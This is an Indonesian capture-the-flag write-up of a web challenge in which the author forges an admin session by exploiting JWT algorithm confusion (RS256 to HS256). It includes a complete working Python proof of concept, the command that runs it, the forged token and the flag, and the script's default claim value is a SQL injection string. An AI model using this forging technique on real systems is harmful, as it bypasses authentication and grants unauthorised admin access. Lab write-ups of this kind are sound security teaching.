# KUNCI TERTUKAR

---

#### 📋 **Challenge Description**

- **Category : Web Exploitation**
- **Point : 450 ( Saat Write Up Dibuat)**

Pintu masuk portal administrasi turnamen menggunakan sistem verifikasi tiket sesi digital untuk membedakan antara peserta umum dan juri kehormatan. Pengunjung biasa yang tidak memiliki izin khusus hanya akan disambut oleh halaman selamat datang standar.

---

**Step 1 : Visit Web**

![image.png](image.png)

Web hanya memiliki 1 halaman yang statis, tidak ada fitur apapun yang ada di web ini. Terdapat JWT Token yang menggunakan algoritma RSA-256 (RS256), status dari sesi kita saat ini yaitu Usernya Guest dan Rolenya Guest, ada juga file public-key.pem yang bisa kita download.

Isi dari public-key.pem :

```bash
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA6Tip81DxrWYwnQrQNHTy
Xl0FzrxdBLq3hk6gWntLPGODkUdQSQJ1xKQm2PewuMkT3eG4FdHqzoCGUxo3y4/2
5NCNPNw3ku/KIJQ8yMkbP+l4kvbcEzHZshNoV+MqA1KHwWoc+98JUN2uhHQPBobz
xDfFfm7w6VJAw4Ygt9FdS36W0B2lCE1+nQ+tF1UjsEs13xr8hES1ZJK4dli8xIYb
xmWE19DJeSjymuUEHUUtgU0EJ/enenN1lHl+wbly2CSsnE5Tfc/2HCEwEQYvO4Kk
Dp8aP4tDPC9l8QJd7AcfkWWco7rfKF5pFMLfberxkDBX/2kBjvIPKm7YdCz/6iDx
bQIDAQAB
-----END PUBLIC KEY-----
```

---

**Step 2 : Decode JWT Token**

Selanjutnya kita coba decode JWT Token yang terlampir di web tersebut menggunakan tools online [jwt.io](https://www.jwt.io/)

Hasil Decode :

![image.png](image%201.png)

Terlihat User dan Role dari sesi kita masi Guest, tujuan kita adalah eskalasi sesi kita menjadi admin atau bisa dibilang mengubah role kita dari guest menjadi admin.

Di sini karena file private-key.pem nya tidak ada, kita bisa gunakan serangan **`Algorithm Confusion (RS256 → HS256)`** atau bisa kita sebut  **`CVE-2015-9235` .**

---

**Step 3 : Exploit JWT Token**

Kita bisa gunakan tools atau poc dari github [https://github.com/aalex954/jwt-key-confusion-poc.git](https://github.com/aalex954/jwt-key-confusion-poc.git)

Script POC :

```python
#JWT Key Confusion (CVE 2015-9235)
#https://github.com/aalex954

import base64
import argparse
import json
import hashlib
import hmac
from colorama import Fore

#Take user input
parser = argparse.ArgumentParser(description="JWT Confusion CVE-2015-9235 PoC for the Hack the Box challenge - Under Construction")
parser.add_argument("token_location", type=str, help="location of JWT token (must include 'pk' payload)", default="./token",nargs="?")
parser.add_argument("claim_key", type=str, help="payload claim to target", default="username",nargs="?")
parser.add_argument("claim_value", type=str, help="new claim value", default='''‘ or 1=1;–''',nargs="?")
args = parser.parse_args()

#Debugging only
# args = parser.parse_args(["./token","username","burp"])

#Load token
print(Fore.YELLOW + "TOKEN DIR:" + args.token_location + Fore.RESET)
token_file = open(args.token_location, "r")
token = token_file.read()
token_file.close()
print()

#Split token into parts (header, payload, signature)
token_parts = []

for parts in token.split("."):
    token_parts.append(parts)

encoded_header = token_parts[0]
encoded_payload = token_parts[1]
encoded_signature = token_parts[2] #dont need this

#Decode jwt token parts
decoded_header = base64.urlsafe_b64decode(encoded_header).decode('UTF-8')
decoded_payload = base64.urlsafe_b64decode(encoded_payload).decode('UTF-8')
decoded_payload_json = json.loads(decoded_payload)

#Pull public key from returned jwt payload
with open("public-key.pem", "r") as f:
    public_key = f.read()

#Removes extra claims from payload for troubleshooting
#decoded_payload_json.pop('pk')
#decoded_payload_json.pop('iat')

#Print Original Decoded JWT
print(Fore.YELLOW + "ORIGINAL TOKEN:" + Fore.RESET)
print(token)
print(Fore.YELLOW + "HEADER: "  + Fore.RESET)
print(decoded_header)
print(Fore.YELLOW + "PAYLOAD: "  + Fore.RESET)
print(json.dumps(decoded_payload_json))
print(Fore.YELLOW + "PUBLIC KEY: "  + Fore.RESET)
print(public_key)

print(Fore.GREEN + "-------------------------------------------NEW TOKEN-------------------------------------------\n" + Fore.RESET)

#Create new header (change from RS256 -> HS256)
header = '{"alg":"HS256","typ":"JWT"}'
headerEncodedBytes = base64.urlsafe_b64encode(header.encode("utf-8"))
encodedHeader = str(headerEncodedBytes, "utf-8").rstrip("=")

#Print new header
print(Fore.YELLOW + "NEW HEADER: " + Fore.RESET)
print(header + "\n")
print(Fore.GREEN + "ENCODED: " + Fore.RESET)
print(headerEncodedBytes)
print()

#Create new payload with claim replaced by user input (key and value)
decoded_payload_json[args.claim_key] = args.claim_value

payload = json.dumps(decoded_payload_json)
payloadEncodedBytes = base64.urlsafe_b64encode(payload.encode("utf-8"))
encodedPayload = str(payloadEncodedBytes, "utf-8").rstrip("=")

#Print new payload data
print(Fore.YELLOW + "NEW PAYLOAD: " + Fore.RESET)
print(payload + "\n")
print(Fore.GREEN + "ENCODED PAYLOAD: " + Fore.RESET)
print(payloadEncodedBytes)
print()

#Build new token
newToken = (encodedHeader + "." + encodedPayload)

#Create new signature
sig = base64.urlsafe_b64encode(
    hmac.new(bytes(public_key, "UTF-8"),newToken.encode('utf-8'),
    hashlib.sha256).digest()
    ).decode('UTF-8').rstrip("=")

print(Fore.GREEN + "ENCODED SINGATURE: " + Fore.RESET)
print(sig + "\n")

#Sign new token
newToken = newToken + "." + sig

#Print new token
print(Fore.YELLOW + "NEW TOKEN: " + Fore.RESET)
print(newToken)

```

Di sini saya ubah untuk variabel public-key nya didapatkan dengan membuka file **`public-key.pem`** yang sudah kita download.

Langsung saja kita run script tersebut.

```bash
python3 jwt-9235.py token role admin
```

- token : file yang berisi JWT Token yang kita dapatkan di awal tadi
- role : target claim yang mau kita ubah valuenya
- admin : value dari claim

Output :

```bash
TOKEN DIR:token

ORIGINAL TOKEN:
eyJhbGciOiAiUlMyNTYiLCAidHlwIjogIkpXVCJ9.eyJ1c2VyIjogImd1ZXN0IiwgInJvbGUiOiAiZ3Vlc3QiLCAiaXNzIjogIml0ZmVzdC1hdXRoLXNlcnZlciJ9.ra2vdkcgAQlsh99VUYsq5xRINC_AH3voMuAtOvItIKMFFUuHgp6MPHtEazIrfStJ7F4qspmcrHd1CZfP4jx61IVSAKRQUyJqGLLu7uWHqilydTP19oLxVXQQsrKaPS02SFDB0fFNMlvRgszDEe6RSYzPjrbd_zPxbVt_y0jgCHNns1SPQVP-2i4bKNJMjAgNlltKgGNjipoRxnUFnhtTXA3j818oYLQxqQDggYxKgHuNR7oMLdYTbIN6wYtD6baLxSc7N9YgzLLnkv35nO_xslZEMAofCp-hACTL_DhNvL5vGkEXaTmpyxbbinC3P1O8FPUlD52DjUIRboi0Jr5lbw

HEADER:
{"alg": "RS256", "typ": "JWT"}
PAYLOAD:
{"user": "guest", "role": "guest", "iss": "itfest-auth-server"}
PUBLIC KEY:
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA6Tip81DxrWYwnQrQNHTy
Xl0FzrxdBLq3hk6gWntLPGODkUdQSQJ1xKQm2PewuMkT3eG4FdHqzoCGUxo3y4/2
5NCNPNw3ku/KIJQ8yMkbP+l4kvbcEzHZshNoV+MqA1KHwWoc+98JUN2uhHQPBobz
xDfFfm7w6VJAw4Ygt9FdS36W0B2lCE1+nQ+tF1UjsEs13xr8hES1ZJK4dli8xIYb
xmWE19DJeSjymuUEHUUtgU0EJ/enenN1lHl+wbly2CSsnE5Tfc/2HCEwEQYvO4Kk
Dp8aP4tDPC9l8QJd7AcfkWWco7rfKF5pFMLfberxkDBX/2kBjvIPKm7YdCz/6iDx
bQIDAQAB
-----END PUBLIC KEY-----

-------------------------------------------NEW TOKEN-------------------------------------------

NEW HEADER:
{"alg":"HS256","typ":"JWT"}

ENCODED:
b'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9'

NEW PAYLOAD:
{"user": "guest", "role": "admin", "iss": "itfest-auth-server"}

ENCODED PAYLOAD:
b'eyJ1c2VyIjogImd1ZXN0IiwgInJvbGUiOiAiYWRtaW4iLCAiaXNzIjogIml0ZmVzdC1hdXRoLXNlcnZlciJ9'

ENCODED SINGATURE:
3irR7BT-Hhs56Kdo9d-gX645HPkxKUck6LBKFy-vGFA

NEW TOKEN:
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjogImd1ZXN0IiwgInJvbGUiOiAiYWRtaW4iLCAiaXNzIjogIml0ZmVzdC1hdXRoLXNlcnZlciJ9.3irR7BT-Hhs56Kdo9d-gX645HPkxKUck6LBKFy-vGFA
```

Token yang baru :

```bash
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjogImd1ZXN0IiwgInJvbGUiOiAiYWRtaW4iLCAiaXNzIjogIml0ZmVzdC1hdXRoLXNlcnZlciJ9.3irR7BT-Hhs56Kdo9d-gX645HPkxKUck6LBKFy-vGFA
```

**Penjelasan Exploit :**

Jadi alur exploitnya itu kita ubah algoritma JWT Tokennya yang dari RSA-256 menjadi HS256, setelah itu value dari nama claim role diisi admin, lalu untuk secret, kita bisa gunakan file  `public-key.pem` yang kita dapatkan sebagai secret, sehingga JWT Token yang dibuat itu dianggap valid.

---

**Step 4 : Ubah Value Cookie**

Token baru sudah didapatkan, langsung saja ubah value dari cookie yang ada di web tersebut dengan JWT Token yang baru kita generate.

Hasil :

![Screenshot 2026-10-17 173412.png](Screenshot_2026-10-17_173412.png)

**`ITFEST{jwt_k3y_c0nfus10n_m4st3r}`**

---